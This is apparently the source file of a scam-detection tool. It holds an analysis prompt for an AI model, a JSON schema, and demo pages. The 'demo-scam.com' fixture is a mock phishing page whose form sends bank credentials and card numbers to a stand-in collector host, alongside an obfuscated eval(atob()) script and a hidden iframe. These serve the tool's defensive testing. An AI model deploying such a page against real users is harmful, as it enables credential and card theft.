import { Type } from '@google/genai';

export const ANALYSIS_PROMPT = `
You are a world-class cybersecurity analyst and web developer expert specializing in detecting online scams, phishing, and malicious websites. Your task is to analyze the provided HTML source code of a website and identify potential threats.

Based on your analysis, provide a structured JSON response. Do not include any text, code block markers, or formatting outside of the single, raw JSON object.

Analyze the HTML source code for the following red flags:
- Phishing Techniques: Forms asking for sensitive information (credentials, credit card details) without proper security context, or designed to mimic a legitimate service.
- Malicious Scripts: Obfuscated JavaScript, suspicious external scripts, or code that performs unexpected actions (like crypto mining).
- Deceptive Content: Text that creates false urgency, scare tactics, fake testimonials, or promises that are too good to be true.
- Misleading Links & Redirects: Links where the anchor text is deceptive, or hidden redirects to malicious sites.
- Technical Red Flags: Use of iframes to load suspicious content, lack of a valid privacy policy or contact information, typosquatting hints in domain name if visible in code.
- Poor Code Quality: Unusually messy or broken HTML can sometimes indicate a hastily-made scam page.

Your response MUST be a single JSON object that conforms to the provided schema.
`;

export const ANALYSIS_SCHEMA = {
  type: Type.OBJECT,
  properties: {
    overallRisk: { type: Type.STRING, enum: ['Low', 'Medium', 'High', 'Very High', 'Unknown'], description: 'The overall risk assessment.' },
    riskScore: { type: Type.INTEGER, description: 'A score from 0 (safe) to 100 (high risk).' },
    summary: { type: Type.STRING, description: 'A one-sentence summary of the findings.' },
    detailedAnalysis: {
      type: Type.ARRAY,
      description: 'A list of specific issues found.',
      items: {
        type: Type.OBJECT,
        properties: {
          category: { type: Type.STRING, description: 'Category of the issue (e.g., Phishing, Malicious Script).' },
          description: { type: Type.STRING, description: 'Detailed explanation of the issue.' },
          severity: { type: Type.STRING, enum: ['Low', 'Medium', 'High', 'Very High'], description: 'Severity of the specific issue.' },
          codeSnippet: { type: Type.STRING, description: 'A relevant snippet of the suspicious code, if applicable.' },
        },
        required: ['category', 'description', 'severity']
      }
    }
  },
  required: ['overallRisk', 'riskScore', 'summary', 'detailedAnalysis']
};

export const DEMO_SITES: { [key: string]: string } = {
  'demo-safe.com': `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>My Awesome Blog</title>
    <style>body { font-family: sans-serif; }</style>
</head>
<body>
    <header><h1>Welcome to My Blog</h1></header>
    <main>
        <article>
            <h2>My First Post</h2>
            <p>This is a paragraph in my first blog post. It's safe and sound.</p>
        </article>
    </main>
    <footer>
        <p>&copy; 2024 My Awesome Blog</p>
        <a href="/privacy">Privacy Policy</a>
    </footer>
</body>
</html>`,

  'demo-scam.com': `
<!DOCTYPE html>
<html>
<head>
<title>Free Luxury Prizе!! Clаim Nоw!</title>
</head>
<body style="background-color:yellow; font-family: 'Comic Sans MS', cursive, sans-serif;">
    <h1 style="color:red; text-align:center; font-size: 50px;">CONGRATULATIONS!!! YOU WON!</h1>
    <p style="text-align:center; font-size: 24px;">You have been selected to receive a FREE luxury car! This offer is valid for 5 minutes ONLY!</p>
    <div style="margin: 50px; padding: 20px; border: 5px dashed red;">
        <h2 style="color:blue;">To claim your PRIZE, enter your details below:</h2>
        <form action="http://malicious-data-collector.info/submit" method="post">
            <label for="username">Bank Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Bank Password:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <label for="cc">Credit Card Number:</label><br>
            <input type="text" id="cc" name="cc"><br><br>
            <input type="submit" value="CLAIM MY FREE CAR NOW!" style="background-color:green; color:white; font-size:30px; padding:20px;">
        </form>
    </div>
    <p>See what other winners are saying!</p>
    <p>"I couldn't believe it! I won a new yacht!" - John S. (real person)</p>
    <script>
      // Obfuscated script to make it harder to read
      eval(atob('Y29uc29sZS5sb2coIlNlbmRpbmcgeW91ciBkYXRhIHRvIHVzLi4uIik7'));
    </script>
    <iframe src="http://suspicious-ad-network.net/ads" width="1" height="1" style="display:none;"></iframe>
</body>
</html>`
};
